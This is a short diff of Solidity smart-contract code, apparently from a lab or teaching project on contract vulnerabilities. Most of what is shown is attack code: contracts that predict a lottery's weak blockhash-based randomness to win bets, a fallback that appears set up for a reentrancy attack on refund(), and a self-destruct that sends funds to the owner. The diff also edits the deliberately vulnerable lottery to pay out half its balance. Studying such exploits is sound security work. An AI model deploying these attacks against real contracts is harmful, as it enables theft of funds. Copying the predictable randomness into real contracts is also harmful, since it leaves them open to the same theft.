@@ -20,10 +20,9 @@ contract predictBet{
    function win() public{
         byte toGuess = byte(blockhash(block.number-1));
         GDGLottery instance = GDGLottery(vulnerable_contract);
-        // require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("bet()")), msg.value));
         instance.bet(toGuess);
-        //vulnerable_contract.call(bytes4(sha3("bet()")));
    }
+   
    
    function get_money(){
         suicide(owner);
@@ -62,7 +61,7 @@ contract GDGLottery {
         byte toGuess = byte(blockhash(block.number-1));
         
         if (toGuess == char) {
-            userBets[msg.sender] = contractBalance() / 10;
+            userBets[msg.sender] = contractBalance() / 2;
             emit LogUserWinner(msg.sender, contractBalance());
         } else {
             userBets[msg.sender] = 0;
@@ -117,6 +116,11 @@ pragma solidity ^0.4.19;
             require(vulnerable_contract.call(bytes4(sha3("refund()"))));
         }  
 
+        function win() public{
+            byte toGuess = byte(blockhash(block.number-1));
+            GDGLottery instance = GDGLottery(vulnerable_contract);
+            instance.bet(toGuess);
+        }
 
         function () public payable{
             // atackModeIsOn is used to execute the attack only once
